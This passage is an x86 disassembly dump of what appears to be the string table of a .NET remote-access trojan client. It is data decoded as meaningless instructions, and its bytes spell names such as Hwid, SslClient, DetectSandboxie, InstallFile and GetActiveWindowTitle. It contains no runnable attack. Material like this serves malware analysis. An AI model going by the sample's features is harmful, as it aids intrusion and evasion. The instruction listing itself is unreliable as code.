  407b78:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7d:	00 52 65             	add    %dl,0x65(%edx)
  407b80:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b83:	76 65                	jbe    0x407bea
  407b85:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b89:	74 5f                	je     0x407bea
  407b8b:	47                   	inc    %edi
  407b8c:	75 69                	jne    0x407bf7
  407b8e:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b92:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407b99:	64 
  407b9a:	53                   	push   %ebx
  407b9b:	79 6e                	jns    0x407c0b
  407b9d:	63 3e                	arpl   %edi,(%esi)
  407b9f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407ba3:	61                   	popa
  407ba4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba8:	67 46                	addr16 inc %esi
  407baa:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb1:	73 43                	jae    0x407bf6
  407bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bbb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc0:	61                   	popa
  407bc1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc5:	67 46                	addr16 inc %esi
  407bc7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bce:	65 65 70 41          	gs gs jo 0x407c13
  407bd2:	6c                   	insb   (%dx),%es:(%edi)
  407bd3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bda:	42                   	inc    %edx
  407bdb:	61                   	popa
  407bdc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bdf:	6e                   	outsb  %ds:(%esi),(%dx)
  407be0:	67 46                	addr16 inc %esi
  407be2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407be9:	65 61                	gs popa
  407beb:	64 65 72 53          	fs gs jb 0x407c42
  407bef:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bf6:	42                   	inc    %edx
  407bf7:	61                   	popa
  407bf8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfc:	67 46                	addr16 inc %esi
  407bfe:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c05:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c0c:	42                   	inc    %edx
  407c0d:	61                   	popa
  407c0e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c11:	6e                   	outsb  %ds:(%esi),(%dx)
  407c12:	67 46                	addr16 inc %esi
  407c14:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c1b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c1f:	61                   	popa
  407c20:	74 65                	je     0x407c87
  407c22:	50                   	push   %eax
  407c23:	6f                   	outsl  %ds:(%esi),(%dx)
  407c24:	6e                   	outsb  %ds:(%esi),(%dx)
  407c25:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c2b:	61                   	popa
  407c2c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c2f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c30:	67 46                	addr16 inc %esi
  407c32:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c39:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3a:	74 65                	je     0x407ca1
  407c3c:	72 76                	jb     0x407cb4
  407c3e:	61                   	popa
  407c3f:	6c                   	insb   (%dx),%es:(%edi)
  407c40:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c45:	61                   	popa
  407c46:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c49:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4a:	67 46                	addr16 inc %esi
  407c4c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c53:	75 66                	jne    0x407cbb
  407c55:	66 65 72 3e          	data16 gs jb 0x407c97
  407c59:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c5d:	61                   	popa
  407c5e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c61:	6e                   	outsb  %ds:(%esi),(%dx)
  407c62:	67 46                	addr16 inc %esi
  407c64:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c6b:	66 66 73 65          	data16 data16 jae 0x407cd4
  407c6f:	74 3e                	je     0x407caf
  407c71:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c75:	61                   	popa
  407c76:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c79:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7a:	67 46                	addr16 inc %esi
  407c7c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c83:	73 6c                	jae    0x407cf1
  407c85:	43                   	inc    %ebx
  407c86:	6c                   	insb   (%dx),%es:(%edi)
  407c87:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c8e:	5f                   	pop    %edi
  407c8f:	42                   	inc    %edx
  407c90:	61                   	popa
  407c91:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c94:	6e                   	outsb  %ds:(%esi),(%dx)
  407c95:	67 46                	addr16 inc %esi
  407c97:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407c9e:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca1:	6c                   	insb   (%dx),%es:(%edi)
  407ca2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca9:	5f                   	pop    %edi
  407caa:	42                   	inc    %edx
  407cab:	61                   	popa
  407cac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407caf:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb0:	67 46                	addr16 inc %esi
  407cb2:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cba:	65 72 41             	gs jb  0x407cfe
  407cbd:	64 64 4d             	fs fs dec %ebp
  407cc0:	61                   	popa
  407cc1:	70 43                	jo     0x407d06
  407cc3:	68 69 6c 64 00       	push   $0x646c69
  407cc8:	49                   	dec    %ecx
  407cc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cca:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccb:	65 72 41             	gs jb  0x407d0f
  407cce:	64 64 41             	fs fs inc %ecx
  407cd1:	72 72                	jb     0x407d45
  407cd3:	61                   	popa
  407cd4:	79 43                	jns    0x407d19
  407cd6:	68 69 6c 64 00       	push   $0x646c69
  407cdb:	68 57 6e 64 00       	push   $0x646e57
  407ce0:	53                   	push   %ebx
  407ce1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ce3:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407ce7:	70 65                	jo     0x407d4e
  407ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cea:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cee:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cf5:	61 
  407cf6:	6c                   	insb   (%dx),%es:(%edi)
  407cf7:	75 65                	jne    0x407d5e
  407cf9:	4b                   	dec    %ebx
  407cfa:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d01:	6c                   	insb   (%dx),%es:(%edi)
  407d02:	61                   	popa
  407d03:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d06:	43                   	inc    %ebx
  407d07:	72 65                	jb     0x407d6e
  407d09:	61                   	popa
  407d0a:	74 65                	je     0x407d71
  407d0c:	49                   	dec    %ecx
  407d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0e:	73 74                	jae    0x407d84
  407d10:	61                   	popa
  407d11:	6e                   	outsb  %ds:(%esi),(%dx)
  407d12:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d15:	73 65                	jae    0x407d7c
  407d17:	74 5f                	je     0x407d78
  407d19:	4d                   	dec    %ebp
  407d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1b:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d20:	6c                   	insb   (%dx),%es:(%edi)
  407d21:	65 4d                	gs dec %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d29:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d30:	64 65 
  407d32:	00 45 6e             	add    %al,0x6e(%ebp)
  407d35:	74 65                	je     0x407d9c
  407d37:	72 44                	jb     0x407d7d
  407d39:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d3d:	4d                   	dec    %ebp
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d44:	79 70                	jns    0x407db6
  407d46:	74 6f                	je     0x407db7
  407d48:	53                   	push   %ebx
  407d49:	74 72                	je     0x407dbd
  407d4b:	65 61                	gs popa
  407d4d:	6d                   	insl   (%dx),%es:(%edi)
  407d4e:	4d                   	dec    %ebp
  407d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d50:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	70 72                	jo     0x407dca
  407d58:	65 73 73             	gs jae 0x407dce
  407d5b:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d62:	00 43 69             	add    %al,0x69(%ebx)
  407d65:	70 68                	jo     0x407dcf
  407d67:	65 72 4d             	gs jb  0x407db7
  407d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6b:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d70:	6c                   	insb   (%dx),%es:(%edi)
  407d71:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d76:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d7b:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d7f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d82:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d87:	65 74 65             	gs je  0x407def
  407d8a:	53                   	push   %ebx
  407d8b:	75 62                	jne    0x407def
  407d8d:	4b                   	dec    %ebx
  407d8e:	65 79 54             	gs jns 0x407de5
  407d91:	72 65                	jb     0x407df8
  407d93:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d97:	74 5f                	je     0x407df8
  407d99:	4d                   	dec    %ebp
  407d9a:	65 73 73             	gs jae 0x407e10
  407d9d:	61                   	popa
  407d9e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407da3:	74 65                	je     0x407e0a
  407da5:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407da9:	6e                   	outsb  %ds:(%esi),(%dx)
  407daa:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dae:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407db5:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407db9:	45                   	inc    %ebp
  407dba:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbb:	75 6d                	jne    0x407e2a
  407dbd:	65 72 61             	gs jb  0x407e21
  407dc0:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dc4:	49                   	dec    %ecx
  407dc5:	44                   	inc    %esp
  407dc6:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd4:	75 62                	jne    0x407e38
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407ddb:	61                   	popa
  407ddc:	70 44                	jo     0x407e22
  407dde:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddf:	75 62                	jne    0x407e43
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407de6:	74 5f                	je     0x407e47
  407de8:	48                   	dec    %eax
  407de9:	61                   	popa
  407dea:	6e                   	outsb  %ds:(%esi),(%dx)
  407deb:	64 6c                	fs insb (%dx),%es:(%edi)
  407ded:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df1:	6e                   	outsb  %ds:(%esi),(%dx)
  407df2:	74 69                	je     0x407e5d
  407df4:	6d                   	insl   (%dx),%es:(%edi)
  407df5:	65 46                	gs inc %esi
  407df7:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407dfe:	64 6c                	fs insb (%dx),%es:(%edi)
  407e00:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e04:	74 4d                	je     0x407e53
  407e06:	6f                   	outsl  %ds:(%esi),(%dx)
  407e07:	64 75 6c             	fs jne 0x407e76
  407e0a:	65 48                	gs dec %eax
  407e0c:	61                   	popa
  407e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0e:	64 6c                	fs insb (%dx),%es:(%edi)
  407e10:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e14:	6e                   	outsb  %ds:(%esi),(%dx)
  407e15:	74 69                	je     0x407e80
  407e17:	6d                   	insl   (%dx),%es:(%edi)
  407e18:	65 54                	gs push %esp
  407e1a:	79 70                	jns    0x407e8c
  407e1c:	65 48                	gs dec %eax
  407e1e:	61                   	popa
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	64 6c                	fs insb (%dx),%es:(%edi)
  407e22:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e26:	74 54                	je     0x407e7c
  407e28:	79 70                	jns    0x407e9a
  407e2a:	65 46                	gs inc %esi
  407e2c:	72 6f                	jb     0x407e9d
  407e2e:	6d                   	insl   (%dx),%es:(%edi)
  407e2f:	48                   	dec    %eax
  407e30:	61                   	popa
  407e31:	6e                   	outsb  %ds:(%esi),(%dx)
  407e32:	64 6c                	fs insb (%dx),%es:(%edi)
  407e34:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e38:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e3f:	65 
  407e40:	00 57 72             	add    %dl,0x72(%edi)
  407e43:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e4a:	6c 
  407e4b:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e50:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e57:	65 74 41             	gs je  0x407e9b
  407e5a:	73 53                	jae    0x407eaf
  407e5c:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	73 74                	jae    0x407eda
  407e66:	61                   	popa
  407e67:	6c                   	insb   (%dx),%es:(%edi)
  407e68:	6c                   	insb   (%dx),%es:(%edi)
  407e69:	46                   	inc    %esi
  407e6a:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e71:	6f 
  407e72:	64 65 46             	fs gs inc %esi
  407e75:	72 6f                	jb     0x407ee6
  407e77:	6d                   	insl   (%dx),%es:(%edi)
  407e78:	46                   	inc    %esi
  407e79:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e80:	65 
  407e81:	42                   	inc    %edx
  407e82:	79 74                	jns    0x407ef8
  407e84:	65 73 54             	gs jae 0x407edb
  407e87:	6f                   	outsl  %ds:(%esi),(%dx)
  407e88:	46                   	inc    %esi
  407e89:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e90:	6e 
  407e91:	52                   	push   %edx
  407e92:	6f                   	outsl  %ds:(%esi),(%dx)
  407e93:	6c                   	insb   (%dx),%es:(%edi)
  407e94:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e98:	6e                   	outsb  %ds:(%esi),(%dx)
  407e99:	64 6f                	outsl  %fs:(%esi),(%dx)
  407e9b:	77 73                	ja     0x407f10
  407e9d:	42                   	inc    %edx
  407e9e:	75 69                	jne    0x407f09
  407ea0:	6c                   	insb   (%dx),%es:(%edi)
  407ea1:	74 49                	je     0x407eec
  407ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea4:	52                   	push   %edx
  407ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea6:	6c                   	insb   (%dx),%es:(%edi)
  407ea7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eab:	74 41                	je     0x407eee
  407ead:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb1:	65 57                	gs push %edi
  407eb3:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407eba:	74 6c                	je     0x407f28
  407ebc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec0:	74 5f                	je     0x407f21
  407ec2:	4d                   	dec    %ebp
  407ec3:	61                   	popa
  407ec4:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ecb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ecf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed0:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ed3:	73 4d                	jae    0x407f22
  407ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed6:	64 75 6c             	fs jne 0x407f45
  407ed9:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407edd:	74 5f                	je     0x407f3e
  407edf:	57                   	push   %edi
  407ee0:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ee7:	79 6c                	jns    0x407f55
  407ee9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407eed:	6f                   	outsl  %ds:(%esi),(%dx)
  407eee:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef1:	73 57                	jae    0x407f4a
  407ef3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407efa:	79 6c                	jns    0x407f68
  407efc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f00:	74 5f                	je     0x407f61
  407f02:	4e                   	dec    %esi
  407f03:	61                   	popa
  407f04:	6d                   	insl   (%dx),%es:(%edi)
  407f05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f09:	74 5f                	je     0x407f6a
  407f0b:	46                   	inc    %esi
  407f0c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f13:	00 
  407f14:	73 65                	jae    0x407f7b
  407f16:	74 5f                	je     0x407f77
  407f18:	46                   	inc    %esi
  407f19:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f20:	00 
  407f21:	47                   	inc    %edi
  407f22:	65 74 54             	gs je  0x407f79
  407f25:	65 6d                	gs insl (%dx),%es:(%edi)
  407f27:	70 46                	jo     0x407f6f
  407f29:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f30:	00 
  407f31:	47                   	inc    %edi
  407f32:	65 74 46             	gs je  0x407f7b
  407f35:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f3c:	00 
  407f3d:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f44:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f49:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4a:	64 75 6c             	fs jne 0x407fb9
  407f4d:	65 4e                	gs dec %esi
  407f4f:	61                   	popa
  407f50:	6d                   	insl   (%dx),%es:(%edi)
  407f51:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f55:	74 5f                	je     0x407fb6
  407f57:	4d                   	dec    %ebp
  407f58:	61                   	popa
  407f59:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f5d:	65 4e                	gs dec %esi
  407f5f:	61                   	popa
  407f60:	6d                   	insl   (%dx),%es:(%edi)
  407f61:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f65:	74 5f                	je     0x407fc6
  407f67:	4f                   	dec    %edi
  407f68:	53                   	push   %ebx
  407f69:	46                   	inc    %esi
  407f6a:	75 6c                	jne    0x407fd8
  407f6c:	6c                   	insb   (%dx),%es:(%edi)
  407f6d:	4e                   	dec    %esi
  407f6e:	61                   	popa
  407f6f:	6d                   	insl   (%dx),%es:(%edi)
  407f70:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f74:	74 5f                	je     0x407fd5
  407f76:	46                   	inc    %esi
  407f77:	75 6c                	jne    0x407fe5
  407f79:	6c                   	insb   (%dx),%es:(%edi)
  407f7a:	4e                   	dec    %esi
  407f7b:	61                   	popa
  407f7c:	6d                   	insl   (%dx),%es:(%edi)
  407f7d:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f81:	56                   	push   %esi
  407f82:	61                   	popa
  407f83:	6c                   	insb   (%dx),%es:(%edi)
  407f84:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f8b:	6e 
  407f8c:	4e                   	dec    %esi
  407f8d:	61                   	popa
  407f8e:	6d                   	insl   (%dx),%es:(%edi)
  407f8f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f93:	74 5f                	je     0x407ff4
  407f95:	55                   	push   %ebp
  407f96:	73 65                	jae    0x407ffd
  407f98:	72 4e                	jb     0x407fe8
  407f9a:	61                   	popa
  407f9b:	6d                   	insl   (%dx),%es:(%edi)
  407f9c:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa1:	65 72 4e             	gs jb  0x407ff2
  407fa4:	61                   	popa
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407faa:	74 4e                	je     0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fb2:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb7:	73 74                	jae    0x40802d
  407fb9:	4e                   	dec    %esi
  407fba:	61                   	popa
  407fbb:	6d                   	insl   (%dx),%es:(%edi)
  407fbc:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc0:	6d                   	insl   (%dx),%es:(%edi)
  407fc1:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fc6:	65 54                	gs push %esp
  407fc8:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fcf:	5f                   	pop    %edi
  407fd0:	4c                   	dec    %esp
  407fd1:	61                   	popa
  407fd2:	73 74                	jae    0x408048
  407fd4:	57                   	push   %edi
  407fd5:	72 69                	jb     0x408040
  407fd7:	74 65                	je     0x40803e
  407fd9:	54                   	push   %esp
  407fda:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe2:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407fe9:	54                   	push   %esp
  407fea:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff1:	74 65                	je     0x408058
  407ff3:	4c                   	dec    %esp
  407ff4:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407ffb:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407ffe:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408002:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408009:	6d                   	insl   (%dx),%es:(%edi)
  40800a:	65 54                	gs push %esp
  40800c:	79 70                	jns    0x40807e
  40800e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408012:	74 5f                	je     0x408073
  408014:	56                   	push   %esi
  408015:	61                   	popa
  408016:	6c                   	insb   (%dx),%es:(%edi)
  408017:	75 65                	jne    0x40807e
  408019:	54                   	push   %esp
  40801a:	79 70                	jns    0x40808c
  40801c:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	75 65                	jne    0x408088
  408023:	54                   	push   %esp
  408024:	79 70                	jns    0x408096
  408026:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  40802a:	67 50                	addr16 push %eax
  40802c:	61                   	popa
  40802d:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408030:	79 70                	jns    0x4080a2
  408032:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408036:	6f                   	outsl  %ds:(%esi),(%dx)
  408037:	74 6f                	je     0x4080a8
  408039:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40803c:	54                   	push   %esp
  40803d:	79 70                	jns    0x4080af
  40803f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408043:	74 54                	je     0x408099
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40804b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40804e:	74 54                	je     0x4080a4
  408050:	79 70                	jns    0x4080c2
  408052:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408056:	6c                   	insb   (%dx),%es:(%edi)
  408057:	65 53                	gs push %ebx
  408059:	68 61 72 65 00       	push   $0x657261
  40805e:	53                   	push   %ebx
  40805f:	79 73                	jns    0x4080d4
  408061:	74 65                	je     0x4080c8
  408063:	6d                   	insl   (%dx),%es:(%edi)
  408064:	2e 43                	cs inc %ebx
  408066:	6f                   	outsl  %ds:(%esi),(%dx)
  408067:	72 65                	jb     0x4080ce
  408069:	00 53 65             	add    %dl,0x65(%ebx)
  40806c:	72 76                	jb     0x4080e4
  40806e:	65 72 73             	gs jb  0x4080e4
  408071:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408078:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  40807c:	6f                   	outsl  %ds:(%esi),(%dx)
  40807d:	73 65                	jae    0x4080e4
  40807f:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408083:	70 6f                	jo     0x4080f4
  408085:	73 65                	jae    0x4080ec
  408087:	00 50 61             	add    %dl,0x61(%eax)
  40808a:	72 73                	jb     0x4080ff
  40808c:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408090:	72 52                	jb     0x4080e4
  408092:	65 76 65             	gs jbe 0x4080fa
  408095:	72 73                	jb     0x40810a
  408097:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40809b:	30 39                	xor    %bh,(%ecx)
  40809d:	43                   	inc    %ebx
  40809e:	65 72 74             	gs jb  0x408115
  4080a1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080a8:	00 56 61             	add    %dl,0x61(%esi)
  4080ab:	6c                   	insb   (%dx),%es:(%edi)
  4080ac:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080b3:	72 
  4080b4:	76 65                	jbe    0x40811b
  4080b6:	72 43                	jb     0x4080fb
  4080b8:	65 72 74             	gs jb  0x40812f
  4080bb:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c2:	00 63 65             	add    %ah,0x65(%ebx)
  4080c5:	72 74                	jb     0x40813b
  4080c7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ce:	00 43 72             	add    %al,0x72(%ebx)
  4080d1:	65 61                	gs popa
  4080d3:	74 65                	je     0x40813a
  4080d5:	00 53 65             	add    %dl,0x65(%ebx)
  4080d8:	74 54                	je     0x40812e
  4080da:	68 72 65 61 64       	push   $0x64616572
  4080df:	45                   	inc    %ebp
  4080e0:	78 65                	js     0x408147
  4080e2:	63 75 74             	arpl   %esi,0x74(%ebp)
